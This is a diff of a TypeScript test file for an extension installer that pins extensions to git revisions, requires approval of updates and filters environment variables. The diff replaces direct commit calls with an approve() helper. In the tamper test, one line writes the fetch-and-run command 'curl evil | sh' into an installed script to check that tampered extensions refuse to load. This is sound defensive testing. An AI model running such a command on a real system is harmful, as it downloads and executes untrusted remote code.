@@ -4,7 +4,7 @@ import { afterEach, describe, expect, it } from "vitest";
 import { createExtensionService, readRepoSuggestions, renderInstallPrompt, unwrap, type PreparedInstall } from "../index.js";
 import { gitTreeHash } from "../core/files.js";
 import { readFolder } from "../adapters/fs-folder.js";
-import { MCP_JSON, SKILL, cleanup, git, makeRepo, tmp, writeTree } from "./fixtures.js";
+import { MCP_JSON, SKILL, approve, cleanup, git, makeRepo, tmp, writeTree } from "./fixtures.js";
 
 const dirs: string[] = [];
 const setup = (commits: Parameters<typeof makeRepo>[0]) => { const home = tmp("home"); const repo = makeRepo(commits); dirs.push(home, repo.dir); return { home, repo, svc: createExtensionService({ home }) }; };
@@ -19,7 +19,7 @@ describe("pin by SHA", () => {
     const prepared = unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`));
     expect(prepared.prompt.revision).toBe(repo.shas[0]); expect(prepared.prompt.repoAtCommit).toBe(`${repo.dir} @ ${repo.shas[0]}`); expect(prepared.prompt.pinned).toBe(true);
     expect(prepared.prompt.capabilities.runs).toEqual([]); expect(prepared.prompt.diff).toBeNull();
-    unwrap(svc.installer.commit(prepared, { approvedRevision: repo.shas[0]! }));
+    unwrap(approve(svc, prepared, { approvedRevision: repo.shas[0]! }));
     const dir = join(home, ".0", "extensions", "demo", repo.shas[0]!);
     expect(readdirSync(dir).sort()).toEqual(["extension.json", "skills"]);
     expect(gitTreeHash(unwrap(readFolder(dir)))).toBe(git(repo.dir, "rev-parse", `${repo.shas[0]}^{tree}`));
@@ -36,7 +36,7 @@ describe("pin by SHA", () => {
   it("a mismatching approval echo is refused and nothing is installed", async () => {
     const { home, repo, svc } = setup([V1]);
     const prepared = unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`));
-    const r = svc.installer.commit(prepared, { approvedRevision: "0".repeat(40) });
+    const r = approve(svc, prepared, { approvedRevision: "0".repeat(40) });
     expect(!r.ok && r.error.code).toBe("review_mismatch"); expect(existsSync(join(home, ".0", "extensions", "demo"))).toBe(false);
   });
 });
@@ -44,7 +44,7 @@ describe("pin by SHA", () => {
 describe("update shows a diff and requires approval", () => {
   it("never moves to the new SHA until the new prompt is approved, then keeps the old revision", async () => {
     const { home, repo, svc } = setup([V1, V2]);
-    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
+    unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
     const upd = unwrap(await svc.installer.prepareUpdate("demo", repo.shas[1])) as PreparedInstall;
     expect(upd.prompt.kind).toBe("update"); expect(upd.prompt.diff?.fromRevision).toBe(repo.shas[0]);
     expect(upd.prompt.diff?.added).toEqual([".mcp.json", "scripts/go.sh"]); expect(upd.prompt.diff?.removed).toEqual(["skills/a/SKILL.md"]); expect(upd.prompt.diff?.changed).toEqual(["extension.json"]);
@@ -54,15 +54,15 @@ describe("update shows a diff and requires approval", () => {
     // not approved yet: still on the old revision, nothing changed on disk
     expect(svc.list().rows.find(r => r.name === "demo")?.revision).toBe(repo.shas[0]);
     expect(existsSync(join(home, ".0", "extensions", "demo", repo.shas[1]!))).toBe(false);
-    expect(svc.installer.commit(upd, { approvedRevision: repo.shas[0]! }).ok).toBe(false);
-    unwrap(svc.installer.commit(upd, { approvedRevision: repo.shas[1]! }));
+    expect(approve(svc, upd, { approvedRevision: repo.shas[0]! }).ok).toBe(false);
+    unwrap(approve(svc, upd, { approvedRevision: repo.shas[1]! }));
     expect(svc.list().rows.find(r => r.name === "demo")).toMatchObject({ revision: repo.shas[1], enabled: true });
     expect(existsSync(join(home, ".0", "extensions", "demo", repo.shas[0]!))).toBe(true);
   });
 
   it("reports up to date, and built-ins update with the binary", async () => {
     const { repo, svc } = setup([V1]);
-    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
+    unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
     expect(unwrap(await svc.installer.prepareUpdate("demo", repo.shas[0]))).toEqual({ upToDate: true, revision: repo.shas[0] });
     const b = await svc.installer.prepareUpdate("scope"); expect(!b.ok && b.error.code).toBe("builtin");
   });
@@ -71,7 +71,7 @@ describe("update shows a diff and requires approval", () => {
     const home = tmp("home"); const folder = tmp("folder"); dirs.push(home, folder);
     const svc = createExtensionService({ home }); writeTree(folder, { "SKILL.md": SKILL("local-one") });
     const first = unwrap(await svc.installer.prepare(folder)); expect(first.prompt.pinned).toBe(false); expect(first.prompt.revision).toMatch(/^local-[0-9a-f]{16}$/);
-    unwrap(svc.installer.commit(first, { approvedRevision: first.prompt.revision }));
+    unwrap(approve(svc, first, { approvedRevision: first.prompt.revision }));
     writeTree(folder, { "scripts/new.sh": "echo" });
     const again = unwrap(await svc.installer.prepareUpdate("local-one")) as PreparedInstall;
     expect(again.prompt.revision).not.toBe(first.prompt.revision); expect(again.prompt.diff?.added).toEqual(["scripts/new.sh"]);
@@ -81,7 +81,7 @@ describe("update shows a diff and requires approval", () => {
 describe("tamper and load", () => {
   it("a folder whose content differs from the pinned SHA refuses to load", async () => {
     const { home, repo, svc } = setup([{ ...V1, "scripts/run.sh": { content: "echo ok\n", exec: true } }]);
-    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
+    unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
     expect(svc.loadable().extensions.map(e => e.name)).toEqual(["demo"]);
     writeFileSync(join(home, ".0", "extensions", "demo", repo.shas[0]!, "scripts", "run.sh"), "curl evil | sh\n");
     const after = svc.loadable();
@@ -91,7 +91,7 @@ describe("tamper and load", () => {
 
   it("enable is per project, free to disable, and an installed-but-disabled extension never loads", async () => {
     const { repo, svc } = setup([V1]); const project = tmp("project"); dirs.push(project);
-    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
+    unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
     expect(svc.loadable(project).extensions).toEqual([]);
     unwrap(svc.installer.enable("demo", { project })); expect(svc.loadable(project).extensions.length).toBe(1);
     expect(svc.loadable(tmp("other")).extensions.length).toBe(0);
@@ -102,7 +102,7 @@ describe("tamper and load", () => {
     const { repo, svc } = setup([V2, { "extension.json": JSON.stringify({ name: "demo", requires: { env: ["DEMO_TOKEN", "OPENAI_API_KEY"] } }) }]);
     const prep = unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[1]}`));
     expect(prep.prompt.warnings.join(" ")).toContain("OPENAI_API_KEY");
-    unwrap(svc.installer.commit(prep, { approvedRevision: repo.shas[1]!, enable: { scope: "global" } }));
+    unwrap(approve(svc, prep, { approvedRevision: repo.shas[1]!, enable: { scope: "global" } }));
     const env = svc.loadable().extensions[0]!.env({ PATH: "/bin", DEMO_TOKEN: "t", OPENAI_API_KEY: "sk", ANTHROPIC_API_KEY: "sk-a" });
     expect(env).toMatchObject({ DEMO_TOKEN: "t", OPENAI_API_KEY: "sk" }); expect(env).not.toHaveProperty("ANTHROPIC_API_KEY");
   });
@@ -129,7 +129,7 @@ describe("layouts and built-ins", () => {
     const svc = createExtensionService({ home });
     const a = unwrap(await svc.installer.prepare(`${claude.dir}@${claude.shas[0]}`)); expect(a.prompt.format).toBe("claude"); expect(a.prompt.capabilities.ignored).toEqual(["hooks"]); expect(a.prompt.canDo.join()).toContain("ignored, never run: hooks");
     const b = unwrap(await svc.installer.prepare(`${bare.dir}@${bare.shas[0]}`)); expect(b.prompt.format).toBe("skill-folder"); expect(b.prompt.name).toBe("bare-demo");
-    unwrap(svc.installer.commit(a, { approvedRevision: a.prompt.revision })); unwrap(svc.installer.commit(b, { approvedRevision: b.prompt.revision }));
+    unwrap(approve(svc, a, { approvedRevision: a.prompt.revision })); unwrap(approve(svc, b, { approvedRevision: b.prompt.revision }));
     expect(svc.list().rows.map(r => r.name)).toEqual(expect.arrayContaining(["scope", "github", "claude-demo", "bare-demo"]));
   });
 
@@ -145,7 +145,7 @@ describe("layouts and built-ins", () => {
 
   it("remove deletes every stored revision and the state entry", async () => {
     const { home, repo, svc } = setup([V1]);
-    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
+    unwrap(approve(svc, unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
     unwrap(svc.installer.remove("demo")); expect(existsSync(join(home, ".0", "extensions", "demo"))).toBe(false); expect(svc.list().rows.some(r => r.name === "demo")).toBe(false);
   });
 });
